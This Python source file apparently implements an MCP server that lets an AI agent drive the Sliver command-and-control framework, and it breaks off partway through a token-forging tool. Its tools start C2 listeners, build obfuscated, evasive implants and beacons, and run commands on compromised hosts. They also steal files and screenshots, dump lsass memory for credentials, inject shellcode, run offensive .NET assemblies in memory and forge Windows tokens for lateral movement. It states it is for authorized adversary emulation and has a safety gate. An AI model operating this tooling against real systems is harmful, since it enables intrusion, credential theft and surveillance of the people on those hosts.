"""FastMCP server exposing the Sliver C2 operator surface as ``mcp__sliver__*`` tools.

Authorized adversary-emulation research only — see the package docstring. The
server registers as ``sliver`` and drives a Sliver team server through sliver-py.
Connection is lazy: the process always starts; tools that need a live client
return a structured "not connected" error until ``connect()`` succeeds.

Architecture mirrors the p0rtix MCP: a thin tool layer over a stateful manager,
structured dict returns, and a noise/arm safety gate enforced on every tool via
the :func:`tool` decorator.
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import functools
import inspect
import os
import shlex
import sys
from pathlib import Path
from typing import Any, Awaitable, Callable

# A beacon task only completes on the next check-in; a *dead* beacon's task
# never returns. Bound the wait so a stale id can't hang the whole MCP. Tune via
# SLIVER_TASK_TIMEOUT (seconds).
BEACON_TASK_TIMEOUT = int(os.environ.get("SLIVER_TASK_TIMEOUT", "300"))


async def _maybe_await(value: Any, timeout: int | None = None) -> Any:
    """Resolve a beacon task result.

    Interactive *session* commands return a protobuf message directly, but
    *beacon* commands return an awaitable Future that completes on the beacon's
    next check-in. Awaiting it yields the same message type. Sessions pass
    through untouched. Beacon waits are bounded so a dead beacon errors cleanly
    instead of hanging.
    """
    if inspect.isawaitable(value):
        t = BEACON_TASK_TIMEOUT if timeout is None else timeout
        return await asyncio.wait_for(value, timeout=t)
    return value

from . import __version__, handoff
from .errors import err, ok
from .implant import build_implant_config, c2_url
from .manager import SliverManager, payload_dir
from .serializers import (
    decode_download,
    parse_osarch_from_name,
    serialize_beacon,
    serialize_beacon_task,
    serialize_execute,
    serialize_implant_build,
    serialize_job,
    serialize_ls,
    serialize_pivot_listener,
    serialize_session,
)


def build_server(manager: SliverManager):
    """Construct the FastMCP app with every tool bound to ``manager``."""
    from mcp.server.fastmcp import FastMCP

    server = FastMCP("sliver")
    mgr = manager

    # -- tool wrapper: safety gate + uniform error handling ----------------
    def tool(
        *,
        tier: str = "passive",
        requires_client: bool = True,
        armed: bool = False,
    ) -> Callable:
        """Decorate an async tool body with the noise gate and error shaping.

        ``tier``            — noise tier checked against the current ceiling.
        ``requires_client`` — refuse with "not connected" if no live client.
        ``armed``           — destructive; refuse unless ``arm_dangerous()`` ran.
        """

        def deco(fn: Callable[..., Awaitable[dict]]) -> Callable[..., Awaitable[dict]]:
            @functools.wraps(fn)
            async def wrapper(*args: Any, **kwargs: Any) -> dict:
                allowed, reason = mgr.safety.check(tier, armed)
                if not allowed:
                    return err(reason, blocked=True, **mgr.safety.snapshot())
                if requires_client and not mgr.connected:
                    return err("not connected — call connect() first")
                try:
                    return await fn(*args, **kwargs)
                except FileNotFoundError as exc:
                    return err(str(exc))
                except ValueError as exc:
                    return err(f"invalid argument: {exc}")
                except (asyncio.TimeoutError, TimeoutError):
                    return err(
                        f"timed out after {BEACON_TASK_TIMEOUT}s — the beacon may "
                        "be sleeping or dead; check list_beacons (next_checkin / "
                        "is_dead) and retry, or raise SLIVER_TASK_TIMEOUT")
                except Exception as exc:  # backend / sliver-py failure
                    return err(f"sliver error: {type(exc).__name__}: {exc}")

            return server.tool()(wrapper)

        return deco

    # ======================================================================
    # Connection / state
    # ======================================================================
    @tool(tier="passive", requires_client=False)
    async def connect(config_path: str | None = None) -> dict:
        """Connect to the Sliver team server using an operator config.

        Call this first. ``config_path`` overrides the ``SLIVER_CONFIG`` env var
        (or the first ``*.cfg`` in ~/.sliver-client/configs). Returns the server
        version and operator name. Re-calling while connected is a no-op refresh.
        """
        version = await mgr.connect(config_path)
        return ok(
            "connected",
            server_version=f"{version.Major}.{version.Minor}.{version.Patch}",
            operator=mgr.operator,
            config=mgr.last_config_path,
            **mgr.safety.snapshot(),
        )

    @tool(tier="passive", requires_client=False)
    async def status() -> dict:
        """Report connection health, server version, and live object counts."""
        if not mgr.connected:
            return ok(
                connected=False,
                config=mgr.last_config_path or mgr._config_path,
                **mgr.safety.snapshot(),
            )
        version = await mgr.client.version()
        sessions = await mgr.client.sessions()
        beacons = await mgr.client.beacons()
        jobs = await mgr.client.jobs()
        return ok(
            connected=True,
            server_version=f"{version.Major}.{version.Minor}.{version.Patch}",
            operator=mgr.operator,
            counts={
                "sessions": len(sessions),
                "beacons": len(beacons),
                "jobs": len(jobs),
            },
            **mgr.safety.snapshot(),
        )

    @tool(tier="passive")
    async def get_version() -> dict:
        """Return the Sliver server version details."""
        v = await mgr.client.version()
        return ok(
            server_version=f"{v.Major}.{v.Minor}.{v.Patch}",
            commit=v.Commit,
            os=v.OS,
            arch=v.Arch,
            compiled_at=v.CompiledAt,
        )

    @tool(tier="passive", requires_client=False)
    async def poll_events() -> dict:
        """Drain buffered server events (session/beacon connect, jobs, etc.)."""
        events = mgr.drain_events()
        return ok(events=events, count=len(events))

    @tool(tier="passive", requires_client=False)
    async def disconnect() -> dict:
        """Disconnect from the team server and stop the event pump."""
        await mgr.disconnect()
        return ok("disconnected")

    # ======================================================================
    # Listeners (C2 infrastructure)
    # ======================================================================
    async def _resolve_job_id(port: int, proto: str) -> int:
        """Return the real job id for a just-started listener.

        sliver-py's listener response messages predate the server's
        ``ListenerJob`` field layout, so their ``JobID`` always reads 0. The
        authoritative ids come from ``jobs()`` — match on port (and protocol
        name) and take the newest.
        """
        jobs = await mgr.client.jobs()
        cands = [j for j in jobs if j.Port == port and proto in (j.Protocol, j.Name)]
        if not cands:
            cands = [j for j in jobs if j.Port == port]
        return max(cands, key=lambda j: j.ID).ID if cands else 0

    @tool(tier="green")
    async def start_https_listener(
        host: str = "0.0.0.0",
        port: int = 443,
        domain: str = "",
        website: str = "",
        acme: bool = False,
    ) -> dict:
        """Start an HTTPS C2 listener. Returns its job id."""
        await mgr.client.start_https_listener(
            host=host, port=port, domain=domain, website=website, acme=acme
        )
        job_id = await _resolve_job_id(port, "https")
        return ok("https listener started", job_id=job_id, protocol="https",
                  host=host, port=port)

    @tool(tier="green")
    async def start_http_listener(
        host: str = "0.0.0.0", port: int = 80, domain: str = "", website: str = ""
    ) -> dict:
        """Start a plain HTTP C2 listener (test/redirector use). Returns job id."""
        await mgr.client.start_http_listener(
            host=host, port=port, domain=domain, website=website
        )
        job_id = await _resolve_job_id(port, "http")
        return ok("http listener started", job_id=job_id, protocol="http",
                  host=host, port=port)

    @tool(tier="green")
    async def start_mtls_listener(host: str = "0.0.0.0", port: int = 8888) -> dict:
        """Start a mutual-TLS C2 listener. Returns its job id."""
        await mgr.client.start_mtls_listener(host=host, port=port)
        job_id = await _resolve_job_id(port, "mtls")
        return ok("mtls listener started", job_id=job_id, protocol="mtls",
                  host=host, port=port)

    @tool(tier="green")
    async def start_dns_listener(
        domains: list[str], host: str = "0.0.0.0", port: int = 53, canaries: bool = True
    ) -> dict:
        """Start a DNS C2 listener for the given parent domain(s). Returns job id."""
        if not domains:
            return err("domains is required (e.g. ['c2.example.com.'])")
        await mgr.client.start_dns_listener(
            domains=domains, host=host, port=port, canaries=canaries
        )
        job_id = await _resolve_job_id(port, "dns")
        return ok("dns listener started", job_id=job_id, protocol="dns",
                  domains=domains, port=port)

    @tool(tier="green")
    async def start_wg_listener(
        tun_ip: str = "", port: int = 53, n_port: int = 8888, key_port: int = 1337
    ) -> dict:
        """Start a WireGuard C2 listener. ``tun_ip`` may be blank to auto-assign."""
        await mgr.client.start_wg_listener(
            tun_ip=tun_ip, port=port, n_port=n_port, key_port=key_port
        )
        job_id = await _resolve_job_id(port, "wg")
        return ok("wg listener started", job_id=job_id, protocol="wg", port=port)

    @tool(tier="passive")
    async def list_jobs() -> dict:
        """List active jobs (listeners). Each has a job_id usable with kill_job."""
        jobs = await mgr.client.jobs()
        return ok(jobs=[serialize_job(j) for j in jobs], count=len(jobs))

    @tool(tier="green")
    async def kill_job(job_id: int) -> dict:
        """Stop a job/listener by its job id."""
        await mgr.client.kill_job(int(job_id))
        return ok("job killed", job_id=int(job_id))

    # ======================================================================
    # Implant / beacon generation
    # ======================================================================
    async def _generate(is_beacon: bool, **kw: Any) -> dict:
        req_name = kw.pop("name", "") or ""
        cfg, url = build_implant_config(is_beacon=is_beacon, **kw)
        gen = await mgr.generate_implant(cfg, name=req_name)
        data = gen.File.Data
        name = gen.File.Name or getattr(gen, "ImplantName", "") or req_name or "implant"
        out_path = payload_dir() / name
        out_path.write_bytes(data)
        return ok(
            "implant generated" if not is_beacon else "beacon generated",
            name=name,
            saved_path=str(out_path),
            size=len(data),
            c2=url,
            is_beacon=is_beacon,
        )

    @tool(tier="green")
    async def generate_implant(
        c2_host: str,
        os: str = "windows",
        arch: str = "amd64",
        fmt: str = "exe",
        protocol: str = "https",
        c2_port: int = 0,
        name: str = "",
        evasion: bool = True,
        obfuscate: bool = True,
        run_at_load: bool = False,
    ) -> dict:
        """Build a session-mode implant (interactive callback). Saved to disk.

        ``fmt``: exe|shellcode|shared_lib|service. ``protocol``: https|http|mtls|
        dns|wg. ``c2_host`` is the callback host/redirector domain.
        """
        return await _generate(
            False, c2_host=c2_host, os=os, arch=arch, fmt=fmt, protocol=protocol,
            c2_port=c2_port, name=name, evasion=evasion, obfuscate=obfuscate,
            run_at_load=run_at_load,
        )

    @tool(tier="green")
    async def generate_beacon(
        c2_host: str,
        os: str = "windows",
        arch: str = "amd64",
        fmt: str = "exe",
        protocol: str = "https",
        c2_port: int = 0,
        interval: int = 60,
        jitter: int = 30,
        name: str = "",
        evasion: bool = True,
        obfuscate: bool = True,
    ) -> dict:
        """Build a beacon-mode implant (async check-in every ``interval`` s ± jitter)."""
        return await _generate(
            True, c2_host=c2_host, os=os, arch=arch, fmt=fmt, protocol=protocol,
            c2_port=c2_port, interval=interval, jitter=jitter, name=name,
            evasion=evasion, obfuscate=obfuscate,
        )

    @tool(tier="passive")
    async def list_implant_builds() -> dict:
        """List previously generated implant builds with metadata.

        Returns per-build ``os``, ``arch``, ``target_triple`` (e.g.
        ``linux/amd64``), ``is_beacon``, ``format``, and ``c2_urls``.

        When the Sliver server stores a build without proto GOOS/GOARCH fields
        (which happens with some pool builds), os/arch are derived from the
        build name via the pool naming convention (``pool-<proto>-<osarch>``)
        and ``os_source`` is ``"name"`` instead of ``"proto"``. This lets the
        operator confirm a pool hit before calling ``regenerate_or_build``
        even when the raw proto metadata is blank.
        """
        builds = await mgr.client.implant_builds()
        out = [serialize_implant_build(n, c) for n, c in (builds or {}).items()]
        return ok(builds=out, count=len(out))

    @tool(tier="passive")
    async def list_implant_profiles() -> dict:
        """List saved implant profiles."""
        profiles = await mgr.client.implant_profiles()
        out = [{"name": p.Name, "os": p.Config.GOOS, "arch": p.Config.GOARCH,
                "is_beacon": p.Config.IsBeacon} for p in profiles]
        return ok(profiles=out, count=len(out))

    @tool(tier="green")
    async def regenerate_implant(name: str) -> dict:
        """Re-download a previously built implant by name, saving it to disk."""
        gen = await mgr.client.regenerate_implant(name)
        data = gen.File.Data
        fname = gen.File.Name or name
        out_path = payload_dir() / fname
        out_path.write_bytes(data)
        return ok("implant regenerated", name=fname, saved_path=str(out_path),
                  size=len(data))

    @tool(tier="yellow")
    async def remove_implant_build(name: str) -> dict:
        """Delete a build from the server's build store by name.

        Use to evict a stale or surplus pool build before replacing it with a
        fresh one. yellow-tier because it is irreversible on the server side.
        On success the named build can no longer be regenerated.
        """
        await mgr.client.delete_implant_build(name)
        return ok("implant build deleted", name=name)

    @tool(tier="green")
    async def regenerate_or_build(
        c2_host: str,
        protocol: str = "https",
        os: str = "windows",
        arch: str = "amd64",
        fmt: str = "exe",
        c2_port: int = 0,
        is_beacon: bool = True,
        interval: int = 60,
        jitter: int = 30,
        evasion: bool = True,
        obfuscate: bool = True,
        evict_stale: bool = True,
    ) -> dict:
        """Reuse an existing pool build or compile a fresh one.

        Searches the server's build store for a build whose callback host,
        protocol, OS, arch, and format all match. Matching builds are
        regenerated (takes seconds); unmatched profiles compile fresh and are
        named ``pool-<proto>-<osarch>`` for future reuse.

        A pool HIT requires the build's *embedded* callback URL to match the
        requested ``c2_host``/``c2_port`` — never just os/arch/format. A build
        that matches the profile but carries a stale callback URL (e.g. a build
        compiled against a previous VPN allocation) would be uploaded, executed,
        and never check in. When ``evict_stale`` is set (the default), such a
        stale same-profile build is deleted via ``remove_implant_build`` and a
        fresh one is compiled, rather than silently reused. The evicted build
        name is reported in ``evicted_stale``.

        This is the preferred first step for default-on C2 per box: call it
        before :func:`generate_beacon` so ~5 stable-LHOST builds can be kept
        on tap and reused across boxes on the same platform VPN.
        """
        # validate arguments via build_implant_config; ValueError bubbles up to
        # the tool wrapper which converts it to err("invalid argument: ...")
        cfg, expected_url = build_implant_config(
            is_beacon=is_beacon, os=os, arch=arch, fmt=fmt,
            protocol=protocol, c2_host=c2_host, c2_port=c2_port,
            interval=interval, jitter=jitter, evasion=evasion, obfuscate=obfuscate,
        )
        os_n = cfg.GOOS
        arch_n = cfg.GOARCH
        proto_n = protocol.lower()
        pool_name = f"pool-{proto_n}-{os_n}{arch_n}"

        # search existing builds for (os, arch, format, C2 URL) match
        builds = await mgr.client.implant_builds() or {}
        matched_name: str | None = None
        stale_name: str | None = None  # same profile, mismatched/unknown callback
        for build_name, build_cfg in builds.items():
            b_goos = getattr(build_cfg, "GOOS", "") or ""
            b_goarch = getattr(build_cfg, "GOARCH", "") or ""
            b_fmt = int(getattr(build_cfg, "Format", 0))

            # Fallback: when the Sliver server returns empty GOOS/GOARCH (a known
            # behaviour for some pool builds), derive os/arch from the build name.
            if not b_goos and not b_goarch:
                b_goos, b_goarch = parse_osarch_from_name(build_name)
                # If Format is also 0 (unset), skip the format check so a name
                # match on a pool build can still qualify.
                if b_goos and b_goarch and b_fmt == 0:
                    b_fmt = cfg.Format  # treat as matching

            if b_goos != os_n or b_goarch != arch_n or b_fmt != cfg.Format:
                continue

            # Profile (os/arch/format) matches. A HIT additionally requires the
            # build's embedded callback URL to match the requested c2_host:port —
            # regenerating a build with a stale URL produces an implant that will
            # never check in. Compare the embedded C2 URLs before declaring a hit.
            build_urls = [getattr(c2, "URL", "") for c2 in getattr(build_cfg, "C2", [])]
            if expected_url in build_urls:
                matched_name = build_name
                break
            # Same profile but no matching callback URL: a stale pool slot. Record
            # the first one so it can be evicted and rebuilt instead of lingering.
            if stale_name is None:
                stale_name = build_name

        if matched_name:
            gen = await mgr.client.regenerate_implant(matched_name)
            data = gen.File.Data
            fname = gen.File.Name or matched_name
            out_path = payload_dir() / fname
            out_path.write_bytes(data)
            return ok(
                "reused existing pool build (regenerated)",
                reused=True,
                matched_name=matched_name,
                name=fname,
                saved_path=str(out_path),
                size=len(data),
                c2=expected_url,
                is_beacon=is_beacon,
            )

        # no callback match — evict a stale same-profile build (if any) so its
        # pool slot is reclaimed, then compile fresh against the current c2_host.
        evicted_stale: str | None = None
        if stale_name is not None and evict_stale:
            try:
                await mgr.client.delete_implant_build(stale_name)
                evicted_stale = stale_name
            except Exception:
                # best-effort eviction; still compile fresh even if delete fails
                evicted_stale = None

        try:
            gen = await mgr.generate_implant(cfg, name=pool_name)
        except Exception as exc:
            exc_str = str(exc)
            if "rename import dir" in exc_str and "target exists" in exc_str:
                # The Sliver team server has a stale build directory on disk that is
                # not tracked in its DB (list_implant_builds returns nothing for this
                # name, but the compile step fails because the directory already
                # exists from a prior run). Surface an actionable remediation instead
                # of the raw gRPC error so the operator knows what to do.
                return err(
                    f"stale build directory on the team server prevents compiling "
                    f"'{pool_name}': the build is absent from the DB but its "
                    f"directory still exists on disk. Remove it on the team server "
                    f"then retry: "
                    f"rm -rf ~/.sliver/slivers/{os_n}/{arch_n}/{pool_name} — "
                    f"or call generate_beacon with a unique name to bypass the slot.",
                    stale_build_dir=True,
                    pool_name=pool_name,
                    os=os_n,
                    arch=arch_n,
                    remedy=f"rm -rf ~/.sliver/slivers/{os_n}/{arch_n}/{pool_name}",
                )
            raise
        data = gen.File.Data
        fname = gen.File.Name or pool_name
        out_path = payload_dir() / fname
        out_path.write_bytes(data)
        msg = "compiled fresh pool build"
        if evicted_stale:
            msg = "evicted stale pool build and compiled fresh"
        return ok(
            msg,
            reused=False,
            name=fname,
            pool_name=pool_name,
            evicted_stale=evicted_stale,
            saved_path=str(out_path),
            size=len(data),
            c2=expected_url,
            is_beacon=is_beacon,
        )

    # ======================================================================
    # Sessions / beacons
    # ======================================================================
    @tool(tier="passive")
    async def list_sessions() -> dict:
        """List active interactive sessions."""
        sessions = await mgr.client.sessions()
        return ok(sessions=[serialize_session(s) for s in sessions],
                  count=len(sessions))

    @tool(tier="passive")
    async def list_beacons() -> dict:
        """List registered beacons (async check-in implants)."""
        beacons = await mgr.client.beacons()
        return ok(beacons=[serialize_beacon(b) for b in beacons], count=len(beacons))

    @tool(tier="passive")
    async def session_info(session_id: str) -> dict:
        """Get details for one session by id."""
        s = await mgr.client.session_by_id(session_id)
        if s is None:
            return err(f"no session with id {session_id}")
        return ok(session=serialize_session(s))

    @tool(tier="passive")
    async def beacon_info(beacon_id: str) -> dict:
        """Get details for one beacon by id."""
        b = await mgr.client.beacon_by_id(beacon_id)
        if b is None:
            return err(f"no beacon with id {beacon_id}")
        return ok(beacon=serialize_beacon(b))

    @tool(tier="yellow")
    async def kill_session(session_id: str, force: bool = False) -> dict:
        """Terminate a session (the implant exits). yellow-tier."""
        await mgr.client.kill_session(session_id, force=force)
        return ok("session killed", session_id=session_id)

    @tool(tier="yellow")
    async def kill_beacon(beacon_id: str) -> dict:
        """Remove a beacon from the server. yellow-tier."""
        await mgr.client.kill_beacon(beacon_id)
        return ok("beacon killed", beacon_id=beacon_id)

    # ======================================================================
    # Execution
    # ======================================================================
    async def _beacon_pending_status(target_id: str, command: str) -> dict:
        """Shape a beacon execute timeout as a structured pending/dead status.

        A beacon task only completes on the next check-in, so within
        ``BEACON_TASK_TIMEOUT`` it is normal for the task to still be queued.
        Rather than an opaque timeout error, report whether the beacon is alive
        (task pending — it will run on the next check-in) or dead (task
        undeliverable), with the check-in timing so the caller can decide to wait
        or move on. Poll :func:`get_beacon_tasks` to watch the task progress.
        """
        b = await mgr.client.beacon_by_id(target_id)
        if b is None:
            return err(
                f"beacon {target_id} is no longer registered — the task may have "
                "been delivered but the beacon is gone")
        info = serialize_beacon(b)
        common = dict(
            beacon_id=target_id,
            command=command,
            next_checkin=info.get("next_checkin"),
            last_checkin=info.get("last_checkin"),
            interval=info.get("interval"),
            jitter=info.get("jitter"),
            tasks_count=info.get("tasks_count"),
            tasks_completed=info.get("tasks_completed"),
            waited_seconds=BEACON_TASK_TIMEOUT,
        )
        if info.get("is_dead"):
            return err(
                "beacon is marked dead — the task could not be delivered",
                task_state="dead", is_dead=True, **common)
        return ok(
            "task queued — awaiting beacon check-in",
            task_state="queued", is_dead=False,
            hint=("the task is pending and will run on the beacon's next "
                  "check-in; poll get_beacon_tasks(beacon_id) or list_beacons, "
                  "or raise SLIVER_TASK_TIMEOUT to wait longer"),
            **common)

    async def _resolve_exec(coro_result: Any, kind: str, target_id: str,
                            command: str) -> tuple[Any, dict | None]:
        """Resolve an execute result, turning a *beacon* timeout into a
        structured pending/dead status instead of an opaque error.

        Returns ``(message, None)`` when the task completed (caller serializes
        the message), or ``(None, status_dict)`` when a beacon task is still
        queued / the beacon is dead (caller returns the dict directly). Session
        results always resolve immediately.
        """
        try:
            return await _maybe_await(coro_result), None
        except (asyncio.TimeoutError, TimeoutError):
            if kind == "beacon":
                return None, await _beacon_pending_status(target_id, command)
            raise

    @tool(tier="yellow")
    async def execute(
        target_id: str, path: str, args: list[str] | None = None, output: bool = True
    ) -> dict:
        """Run an executable on a session or beacon. yellow-tier (host telemetry).

        ``target_id`` resolves to a session or beacon automatically. For beacons
        the result returns once the next check-in completes the task; if the
        check-in does not arrive within ``SLIVER_TASK_TIMEOUT`` the call returns a
        structured ``task_state="queued"`` status (the task is still pending) or
        ``task_state="dead"`` (the beacon is gone) instead of a bare timeout.
        """
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.execute(path, args or [], output), kind, target_id, path)
        if pending is not None:
            return pending
        return ok(target_kind=kind, **serialize_execute(res))

    @tool(tier="yellow")
    async def execute_command(
        target_id: str, command_line: str, output: bool = True
    ) -> dict:
        """Convenience: shell-split ``command_line`` and run it. yellow-tier.

        On a beacon, a task that has not been picked up within
        ``SLIVER_TASK_TIMEOUT`` returns a ``task_state="queued"`` status (pending,
        will run on the next check-in) rather than a timeout error — poll
        :func:`get_beacon_tasks` to track it.
        """
        parts = shlex.split(command_line)
        if not parts:
            return err("command_line is empty")
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.execute(parts[0], parts[1:], output),
            kind, target_id, command_line)
        if pending is not None:
            return pending
        return ok(target_kind=kind, command=command_line, **serialize_execute(res))

    @tool(tier="passive")
    async def get_beacon_tasks(beacon_id: str) -> dict:
        """List tasks queued/sent/completed for a beacon.

        Use after :func:`execute` / :func:`execute_command` on a beacon returns
        ``task_state="queued"``: each task carries a ``state``
        (pending/sent/completed) and timing, so the caller can tell whether a
        queued task has since been picked up. ``pending`` counts the tasks not
        yet completed.
        """
        b = await mgr.client.beacon_by_id(beacon_id)
        if b is None:
            return err(f"no beacon with id {beacon_id}")
        tasks = await mgr.client.beacon_tasks(beacon_id)
        out = [serialize_beacon_task(t) for t in tasks]
        pending = sum(1 for t in out
                      if str(t["state"]).lower() not in ("completed", "canceled"))
        return ok(beacon_id=beacon_id, tasks=out, count=len(out), pending=pending)

    # ======================================================================
    # File operations
    # ======================================================================
    async def _interact_or_err(target_id: str):
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return None, err(f"no session or beacon with id {target_id}")
        return interactive, None

    @tool(tier="green")
    async def ls(target_id: str, path: str = ".") -> dict:
        """List a remote directory on a session/beacon."""
        interactive, e = await _interact_or_err(target_id)
        if e:
            return e
        res = await _maybe_await(await interactive.ls(path))
        return ok(**serialize_ls(res))

    @tool(tier="green")
    async def pwd(target_id: str) -> dict:
        """Get the remote working directory."""
        interactive, e = await _interact_or_err(target_id)
        if e:
            return e
        res = await _maybe_await(await interactive.pwd())
        return ok(path=res.Path)

    @tool(tier="green")
    async def cd(target_id: str, path: str) -> dict:
        """Change the remote working directory."""
        interactive, e = await _interact_or_err(target_id)
        if e:
            return e
        res = await _maybe_await(await interactive.cd(path))
        return ok(path=res.Path)

    @tool(tier="green")
    async def mkdir(target_id: str, path: str) -> dict:
        """Create a remote directory."""
        interactive, e = await _interact_or_err(target_id)
        if e:
            return e
        res = await _maybe_await(await interactive.mkdir(path))
        return ok("created", path=res.Path)

    @tool(tier="green")
    async def download(
        target_id: str, remote_path: str, save_path: str | None = None
    ) -> dict:
        """Download a remote file. Saves to ``save_path`` (or the payload dir).

        Returns the local path and size; for text files also a UTF-8 preview.
        """
        interactive, e = await _interact_or_err(target_id)
        if e:
            return e
        res = await _maybe_await(await interactive.download(remote_path))
        if not res.Exists:
            return err(f"remote path does not exist: {remote_path}")
        data = decode_download(res)
        dest = Path(save_path) if save_path else payload_dir() / Path(remote_path).name
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        preview = data[:2048].decode("utf-8", errors="replace") if data else ""
        return ok("downloaded", remote_path=remote_path, saved_path=str(dest),
                  size=len(data), preview=preview)

    @tool(tier="yellow")
    async def upload(
        target_id: str,
        remote_path: str,
        local_path: str | None = None,
        data_b64: str | None = None,
    ) -> dict:
        """Upload a file to a session/beacon from a local file or base64 data."""
        interactive, e = await _interact_or_err(target_id)
        if e:
            return e
        if local_path:
            data = Path(local_path).read_bytes()
        elif data_b64 is not None:
            data = base64.b64decode(data_b64)
        else:
            return err("provide local_path or data_b64")
        res = await _maybe_await(await interactive.upload(remote_path, data))
        return ok("uploaded", remote_path=res.Path, size=len(data))

    @tool(tier="red", armed=True)
    async def rm(
        target_id: str, path: str, recursive: bool = False, force: bool = False
    ) -> dict:
        """Delete a remote file/dir. RED-tier — requires arm_dangerous() first."""
        interactive, e = await _interact_or_err(target_id)
        if e:
            return e
        res = await _maybe_await(await interactive.rm(path, recursive=recursive, force=force))
        return ok("removed", path=res.Path, recursive=recursive)

    # ======================================================================
    # Process inspection
    # ======================================================================
    @tool(tier="green")
    async def ps(target_id: str) -> dict:
        """List running processes on the implant host. green-tier."""
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.ps(), kind, target_id, "ps")
        if pending is not None:
            return pending
        procs = [
            {"pid": p.Pid, "executable": p.Executable,
             "owner": p.Owner, "session_id": p.SessionID}
            for p in res
        ]
        return ok(target_kind=kind, processes=procs, count=len(procs))

    @tool(tier="green")
    async def ifconfig(target_id: str) -> dict:
        """List network interfaces on the implant host. green-tier."""
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.ifconfig(), kind, target_id, "ifconfig")
        if pending is not None:
            return pending
        interfaces = [
            {"index": iface.Index, "name": iface.Name,
             "mac": iface.MAC, "ips": list(iface.IPAddresses)}
            for iface in res.NetInterfaces
        ]
        return ok(target_kind=kind, interfaces=interfaces)

    @tool(tier="green")
    async def netstat(
        target_id: str,
        tcp: bool = True,
        udp: bool = False,
        ipv4: bool = True,
        ipv6: bool = False,
        listening: bool = True,
    ) -> dict:
        """List network connections on the implant host. green-tier."""
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.netstat(
                tcp=tcp, udp=udp, ipv4=ipv4, ipv6=ipv6, listening=listening),
            kind, target_id, "netstat")
        if pending is not None:
            return pending
        entries = []
        for e in res.Entries:
            proc = getattr(e, "Process", None)
            entries.append({
                "local": f"{e.LocalAddr.Ip}:{e.LocalAddr.Port}",
                "remote": f"{e.RemoteAddr.Ip}:{e.RemoteAddr.Port}",
                "state": e.SkState,
                "process": {"pid": proc.Pid, "exe": proc.Executable}
                           if proc and proc.Pid else None,
            })
        return ok(target_kind=kind, entries=entries, count=len(entries))

    @tool(tier="green")
    async def screenshot(target_id: str, save_path: str | None = None) -> dict:
        """Capture a desktop screenshot from the implant host. Saved as PNG. green-tier."""
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.screenshot(), kind, target_id, "screenshot")
        if pending is not None:
            return pending
        data = res.Data
        dest = Path(save_path) if save_path else payload_dir() / "screenshot.png"
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        return ok("screenshot captured", target_kind=kind,
                  saved_path=str(dest), size_bytes=len(data))

    @tool(tier="yellow")
    async def process_dump(target_id: str, pid: int, save_path: str | None = None) -> dict:
        """Dump a remote process memory by PID. yellow-tier.

        Common use: lsass PID for credential extraction. Find lsass PID with ps().
        """
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.process_dump(pid), kind, target_id,
            f"process_dump pid={pid}")
        if pending is not None:
            return pending
        data = res.Data
        dest = Path(save_path) if save_path else payload_dir() / f"procdump_{pid}.bin"
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        return ok("process dumped", target_kind=kind, pid=pid,
                  saved_path=str(dest), size_bytes=len(data))

    # ======================================================================
    # In-memory execution
    # ======================================================================
    @tool(tier="yellow")
    async def execute_assembly(
        target_id: str,
        assembly_path: str,
        arguments: str = "",
        process: str = "notepad.exe",
        is_dll: bool = False,
        arch: str = "x86_64",
        class_name: str = "",
        method: str = "",
        app_domain: str = "",
    ) -> dict:
        """Execute a .NET assembly in-memory on the implant host. yellow-tier.

        ``assembly_path`` is the local path to the .NET assembly (.exe/.dll).
        Common assemblies: SharpHound.exe, Rubeus.exe, Seatbelt.exe, SharpUp.exe,
        Certify.exe (from the Sliver armory or the payload dir).
        Nothing lands on disk — the assembly is CLR-injected into ``process``.
        """
        asm_file = Path(assembly_path)
        if not asm_file.exists():
            asm_file = payload_dir() / assembly_path
        if not asm_file.exists():
            return err(f"assembly not found: {assembly_path} (also checked payload dir)")
        asm_bytes = asm_file.read_bytes()

        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.execute_assembly(
                asm_bytes, arguments, process, is_dll, arch,
                class_name, method, app_domain),
            kind, target_id, f"execute_assembly {asm_file.name}")
        if pending is not None:
            return pending
        return ok(target_kind=kind, assembly=asm_file.name,
                  arguments=arguments, output=res.Output)

    @tool(tier="yellow")
    async def execute_shellcode(
        target_id: str,
        shellcode_b64: str,
        pid: int = 0,
        rwx: bool = False,
        encoder: str = "",
    ) -> dict:
        """Inject shellcode into a remote process by PID. yellow-tier.

        ``shellcode_b64`` is the raw shellcode base64-encoded.
        ``pid`` 0 means spawn a sacrificial process for injection.
        """
        try:
            shellcode = base64.b64decode(shellcode_b64)
        except Exception:
            return err("shellcode_b64 is not valid base64")
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.execute_shellcode(shellcode, rwx, pid, encoder),
            kind, target_id, "execute_shellcode")
        if pending is not None:
            return pending
        return ok("shellcode injected", target_kind=kind, pid=pid,
                  size_bytes=len(shellcode))

    # ======================================================================
    # Token ops (Windows only)
    # ======================================================================
    @tool(tier="yellow")
    async def make_token(
        target_id: str, username: str, password: str, domain: str = ""
    ) -> dict:
        """Create a Windows user token from credentials. yellow-tier.

        Does not require the user to be logged on locally; creates a network-type
        token for lateral movement. Verify with execute_command(whoami /all).
        """
